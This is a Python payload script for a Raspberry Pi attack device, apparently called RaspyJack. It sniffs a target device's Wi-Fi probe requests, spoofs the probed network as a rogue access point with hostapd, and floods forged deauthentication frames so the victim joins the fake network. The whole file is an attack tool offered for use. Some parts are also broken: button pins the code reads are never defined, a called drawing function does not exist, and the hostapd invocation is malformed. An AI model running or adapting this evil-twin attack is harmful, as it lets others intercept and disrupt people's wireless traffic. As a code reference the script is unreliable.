#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **WiFi: Known Networks Deauth**
======================================================
A more intelligent deauthentication attack. This payload first sniffs
for probe requests to identify a network the target device is actively
looking for. It then spoofs that network name as a rogue AP while
simultaneously deauthenticating the client from its legitimate network.

The goal is to trick the client into automatically connecting to the
rogue AP, believing it's a known, trusted network.
"""

import os, sys, subprocess, signal, time, threading
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

try:
    from scapy.all import *
    conf.verb = 0
except ImportError:
    sys.exit(1)

# --- CONFIGURATION ---
try:
    sys.path.append('/root/Raspyjack/wifi/')
    from wifi.raspyjack_integration import get_available_interfaces
    from wifi.wifi_manager import WiFiManager
    WIFI_INTEGRATION = True
    wifi_manager = WiFiManager()
    print("✅ WiFi integration loaded - dynamic interface support enabled")
except ImportError as e:
    print(f"⚠️  WiFi integration not available: {e}")
    WIFI_INTEGRATION = False
    wifi_manager = None # Ensure wifi_manager is None if import fails

WIFI_INTERFACE = None # Will be set by user selection
ORIGINAL_WIFI_INTERFACE = None # Added to store original interface name
TARGET_CLIENT_MAC = "AA:BB:CC:DD:EE:FF" # MAC of the target client device

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
status_msg = "Press OK to start"
probed_ssid = None
attack_procs = {}

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
    running = False
    for proc in attack_procs.values():
        try: os.kill(proc.pid, signal.SIGTERM)
        except: pass
    
    # Deactivate monitor mode on cleanup
    if WIFI_INTERFACE and wifi_manager and ORIGINAL_WIFI_INTERFACE:
        print(f"Deactivating monitor mode on {WIFI_INTERFACE} and restoring {ORIGINAL_WIFI_INTERFACE}...")
        wifi_manager.deactivate_monitor_mode(WIFI_INTERFACE)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui():
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Known Net Deauth", font=FONT_TITLE, fill="#FFC300")
    d.line([(0, 22), (128, 22)], fill="#FFC300", width=1)
    d.text((5, 30), f"Target: {TARGET_CLIENT_MAC}", font=FONT)
    d.text((10, 50), status_msg, font=FONT, fill="yellow")
    if probed_ssid:
        d.text((10, 70), f"Probed: {probed_ssid}", font=FONT, fill="lime")
    d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_ui_interface_selection(interfaces, current_selection):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Select Interface", font=FONT_TITLE, fill="cyan")
    d.line([(0, 22), (128, 22)], fill="cyan", width=1)

    y_pos = 25
    for i, iface in enumerate(interfaces):
        color = "yellow" if i == current_selection else "white"
        d.text((5, y_pos), iface, font=FONT, fill=color)
        y_pos += 11
    
    d.text((5, 115), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def select_interface_menu():
    global WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, status_msg
    
    if not WIFI_INTEGRATION or not wifi_manager:
        draw_message("WiFi integration not available!", "red")
        time.sleep(3)
        return False

    available_interfaces = [iface for iface in get_available_interfaces() if iface.startswith('wlan')]
    if not available_interfaces:
        draw_message("No WiFi interfaces found!", "red")
        time.sleep(3)
        return False

    current_menu_selection = 0
    while running:
        draw_ui_interface_selection(available_interfaces, current_menu_selection)
        
        if GPIO.input(PINS["UP"]) == 0:
            current_menu_selection = (current_menu_selection - 1 + len(available_interfaces)) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["DOWN"]) == 0:
            current_menu_selection = (current_menu_selection + 1) % len(available_interfaces)
            time.sleep(0.2)
        elif GPIO.input(PINS["OK"]) == 0:
            selected_iface = available_interfaces[current_menu_selection]
            draw_message(f"Activating monitor\nmode on {selected_iface}...", "yellow")
            
            monitor_iface = wifi_manager.activate_monitor_mode(selected_iface)
            if monitor_iface:
                WIFI_INTERFACE = monitor_iface
                ORIGINAL_WIFI_INTERFACE = selected_iface # Store original for cleanup
                draw_message(f"Monitor mode active\non {WIFI_INTERFACE}", "lime")
                time.sleep(2)
                return True
            else:
                draw_message(f"Failed to activate\nmonitor mode on {selected_iface}", "red")
                time.sleep(3)
                return False
        elif GPIO.input(PINS["KEY3"]) == 0: # Cancel
            return False
        
        time.sleep(0.1)

# --- Attacker ---
def packet_handler(pkt):
    global probed_ssid, status_msg
    # Check for probe requests from our target client
    if pkt.haslayer(Dot11ProbeReq) and pkt.addr2.lower() == TARGET_CLIENT_MAC.lower():
        ssid = pkt.info.decode()
        if ssid:
            probed_ssid = ssid
            status_msg = "SSID Found! Starting..."
            # Stop sniffing
            raise StopIteration

def run_attack():
    global status_msg, probed_ssid
    
    # 1. Sniff for a probe request from the target
    status_msg = "Sniffing probes..."
    probed_ssid = None
    try:
        sniff(iface=WIFI_INTERFACE, prn=packet_handler, timeout=60)
    except StopIteration:
        pass # This is how we break out on success

    if not probed_ssid:
        status_msg = "No probes found."
        return

    # 2. Launch a rogue AP with the probed SSID
    rogue_ap_cmd = f"hostapd -C 'interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={probed_ssid}\\nhw_mode=g\\nchannel=6\\n'"
    attack_procs['hostapd'] = subprocess.Popen(rogue_ap_cmd, shell=True)
    
    # 3. Deauthenticate the client from its current network
    # We don't know the BSSID, so we send a broadcast deauth from the client
    status_msg = f"Deauthing {TARGET_CLIENT_MAC}"
    deauth_pkt = RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=TARGET_CLIENT_MAC, addr3=TARGET_CLIENT_MAC)/Dot11Deauth(reason=7)
    
    end_time = time.time() + 30 # Deauth for 30 seconds
    while time.time() < end_time and running:
        sendp(deauth_pkt, iface=WIFI_INTERFACE, count=10, inter=0.1, verbose=0)
        time.sleep(1)
        
    status_msg = "Attack finished."

# --- Main Loop ---
try:
    # Dependency checks
    for cmd in ["hostapd"]: # Add other dependencies if needed
        if subprocess.run(f"which {cmd}", shell=True, capture_output=True).returncode != 0:
            draw_message(f"{cmd} not found!", "red")
            time.sleep(3)
            raise SystemExit(f"{cmd} not found.")

    if not select_interface_menu():
        draw_message("No interface selected\nor monitor mode failed.", "red")
        time.sleep(3)
        raise SystemExit("No interface selected or monitor mode failed.")

    while running:
        draw_ui()
        if GPIO.input(PINS["KEY3"]) == 0: cleanup(); break
        if GPIO.input(PINS["OK"]) == 0:
            threading.Thread(target=run_attack, daemon=True).start()
            time.sleep(0.3)
            while "finished" not in status_msg.lower() and "found" not in status_msg.lower():
                if GPIO.input(PINS["KEY3"]) == 0: cleanup(); break
                time.sleep(1)
        time.sleep(0.1)
except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Known Networks Deauth payload finished.")
